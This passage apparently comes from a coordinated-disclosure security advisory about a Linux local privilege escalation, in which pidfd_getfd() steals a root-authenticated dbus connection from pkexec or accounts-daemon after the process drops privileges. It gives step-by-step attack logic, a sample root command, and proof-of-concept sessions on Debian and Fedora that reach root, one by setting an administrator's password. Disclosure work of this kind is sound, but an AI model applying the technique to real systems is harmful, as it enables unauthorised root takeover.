  the system dbus (i.e., it will be closed later, at line 1109);

- at lines 1086-1087, pkexec fully drops its privileges (to the user
  specified by the --user option at line 585).

Consequently:

- if we (attackers) execute pkexec with our own user as the --user
  option, and SIGKILL pkexec immediately after it drops its privileges
  to our uid and gid (at lines 1086-1087);

- then, if we call pidfd_getfd() in a tight loop, we can steal pkexec's
  connection to the system dbus, which is already authenticated as root;

- and send a request to systemd (pid 1) over this connection to start a
  transient unit (StartTransientUnit) and execute an arbitrary command
  with full root privileges (ExecStart=3D/bin/sh -c 'id>>/tmp/pwned' for
  example).

At first sight, it would seem that only a real "allow_active" user can
carry out this attack against pkexec; but not necessarily so, thanks to
Pumpkin Chang's clever "Trick 1 - Abuse Rule Limitations" from:

  https://u1f383.github.io/linux/2025/05/25/dbus-and-polkit-introduction.ht=
ml

In the following proof of concept, we (attackers) log in to the target
computer as the user jane, remotely via sshd, while the real user jane
is physically sitting at the computer (tty1). Our attempt at executing
pkexec naturally fails, because we are not an "allow_active" user; but
if we make the same attempt via systemd-run, it surprisingly succeeds.
We can therefore attack pkexec and execute arbitrary commands as root,
even though we are not really an "allow_active" user:

------------------------------------------------------------------------
> ssh jane@target

$ cat /etc/os-release
PRETTY_NAME=3D"Debian GNU/Linux 13 (trixie)"

$ id
uid=3D1001(jane) gid=3D1001(jane) groups=3D1001(jane),100(users)

$ w
 17:39:07 up  4:43,  2 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU  WHAT
jane     pts/0    192.168.56.1     16:44    3.00s  0.21s  0.01s w
jane     tty1     -                12:56    4:42m  0.05s  0.05s -bash

$ stat /usr/bin/pkexec
Access: (4755/-rwsr-xr-x)  Uid: (    0/    root)   Gid: (    0/    root)

$ /usr/bin/pkexec --user jane /usr/libexec/gsd-backlight-helper
Error executing command as another user: Not authorized
This incident has been reported.

$ systemd-run --user -- /bin/sh -c '/usr/bin/pkexec --user jane /usr/libexe=
c/gsd-backlight-helper > ~/output 2>&1'
Running as unit: run-p1550-i1850.service; invocation ID: 4e02cd9e5d7f455ea0=
77db849fddd1e1

$ cat ~/output
This program can only be used by the root user

$ systemd-run --user -- /bin/sh -c '~/exploit-pkexec > ~/output 2>&1'
Running as unit: run-p1567-i1867.service; invocation ID: e014d0fea3bb42d188=
e290c6d4eceed0

$ cat ~/output
Unit path is "/org/freedesktop/systemd1/job/4235".

$ cat /tmp/pwned
uid=3D0(root) gid=3D0(root) groups=3D0(root)
------------------------------------------------------------------------


=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
Case study: accounts-daemon
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D

accounts-daemon is a root daemon from the accountsservice package,
installed by default on most Linux desktop distributions. In the strace
output below, we (attackers) send a request to accounts-daemon, over
dbus, to set our avatar (SetIconFile) to /etc/issue (for example):

------------------------------------------------------------------------
617  close_range(3, 4294967295, CLOSE_RANGE_CLOEXEC) =3D 0
...
728  setgid(1001)                      =3D 0
729  setuid(1001)                      =3D 0
730  execve("/bin/cat", ["/bin/cat", "/etc/issue"], 0x7fff22a14f58 /* 13 va=
rs */ <unfinished ...>
------------------------------------------------------------------------

- at line 617, accounts-daemon sets the close-on-exec flag on all file
  descriptors >=3D 3, including its connection to the system dbus, which
  is authenticated as root (i.e., it will be closed later, at line 730);

- at lines 728-729, accounts-daemon fully drops its privileges (to our
  own uid and gid).

Consequently:

- if we send a request to accounts-daemon to reset our avatar, and if we
  SIGKILL accounts-daemon immediately after it drops its privileges (at
  lines 728-729) but before it executes /bin/cat (at line 730);

- then, if we call pidfd_getfd() in a tight loop, we can steal
  accounts-daemon's connection to the system dbus, which is still
  authenticated as root;

- and send a request to systemd over this connection to start a
  transient unit and execute an arbitrary command with full root
  privileges.

------------------------------------------------------------------------
$ cat /etc/os-release
PRETTY_NAME=3D"Debian GNU/Linux 13 (trixie)"

$ id
uid=3D1001(jane) gid=3D1001(jane) groups=3D1001(jane),100(users)

$ ps -ef | grep accounts-daemon
root         578       1  0 06:07 ?        00:00:00 /usr/libexec/accounts-d=
aemon

$ ./exploit-accounts-daemon
daemon_pid 578=20
cat_pid? 902 (accounts-daemon) R 578 578 578 0 -1 4194368 0 0 0 0 0 0 0=20
cat_pid? 902 (accounts-daemon) R 578 578 578 0 -1 4194368 24 0 0 0 0 0 0
cat_pid? 902 (accounts-daemon) R 578 578 578 0 -1 4194368 32 0 0 0 0 0 0
cat_pid? 903 (accounts-daemon) R 902 578 578 0 -1 4194368 0 0 0 0 0 0 0=20
cat_pid! 903 (accounts-daemon) R 902 578 578 0 -1 4194368 0 0 0 0 0 0 0=20
tries 165
fd 4
tries 20
Error: GDBus.Error:org.freedesktop.Accounts.Error.Failed: copying file '/et=
c/issue' to '/var/lib/AccountsService/icons/jane' failed: unknown reason
died in dbus: 60

$ cat /tmp/pwned
uid=3D0(root) gid=3D0(root) groups=3D0(root)
------------------------------------------------------------------------

On Fedora, SELinux prevents accounts-daemon from starting a transient
systemd unit, but we can send a request to another dbus daemon instead;
for example, we can send a request to accounts-daemon itself, to set an
administrator's password (SetPassword) of our choice, and then su to
this administrator, and then sudo to root:

------------------------------------------------------------------------
$ cat /etc/os-release
PRETTY_NAME=3D"Fedora Linux 44 (Workstation Edition)"

$ id
uid=3D1001(jane) gid=3D1001(jane) groups=3D1001(jane) context=3Dunconfined_=
u:unconfined_r:unconfined_t:s0-s0:c0.c1023

$ ps -ef | grep accounts-daemon
root         941       1  0 09:17 ?        00:00:00 /usr/libexec/accounts-d=
aemon

$ su -l john
Password: RadicalEdward
su: Authentication failure

$ ./exploit-accounts-daemon
daemon_pid 941=20
cat_pid? 2749 (accounts-daemon) R 941 941 941 0 -1 4194368 7 0 0 0 0 0 0
cat_pid? 2749 (accounts-daemon) R 941 941 941 0 -1 4194368 23 0 0 0 0 0=20
cat_pid? 2749 (accounts-daemon) R 941 941 941 0 -1 4194368 38 0 0 0 0 0=20
cat_pid? 2750 (accounts-daemon) R 2749 941 941 0 -1 4194368 0 0 0 0 0 0=20
cat_pid! 2750 (accounts-daemon) R 2749 941 941 0 -1 4194368 0 0 0 0 0 0=20
tries 245
fd 4
tries 12
Error: GDBus.Error:org.freedesktop.Accounts.Error.Failed: copying file '/et=
c/issue' to '/var/lib/AccountsService/icons/jane' failed: unknown reason
died in dbus: 59

$ su -l john
Password: RadicalEdward

$ id
uid=3D1000(john) gid=3D1000(john) groups=3D1000(john),10(wheel) context=3Du=
nconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023

$ sudo -i
[sudo] password for john: RadicalEdward

# id
uid=3D0(root) gid=3D0(root) groups=3D0(root) context=3Dunconfined_u:unconfi=
ned_r:unconfined_t:s0-s0:c0.c1023
------------------------------------------------------------------------


=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
Acknowledgments
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D

We thank the security@kernel (in particular, Linus Torvalds, Christian
Brauner, Kees Cook, Oleg Nesterov) for their work on this vulnerability.
We also thank the linux-distros@openwall (in particular, Solar Designer,
Sam James, Salvatore Bonaccorso) for their help with this disclosure.

This advisory was written in loving memory of CVE-2001-1384 (by Rafal
"nergal" Wojtczuk) and CVE-2003-0127 (by Wojciech "cliph" Purczynski).


=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
Timeline
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D

2026-05-11: Advisory and proof of concept sent to the security@kernel.

2026-05-14: Patch committed publicly (31e62c2) by Linus Torvalds.

2026-05-14: Heads-up sent to the private linux-distros@openwall.

2026-05-15: Heads-up sent to the public oss-security@openwall.

2026-05-20: Advisory published.
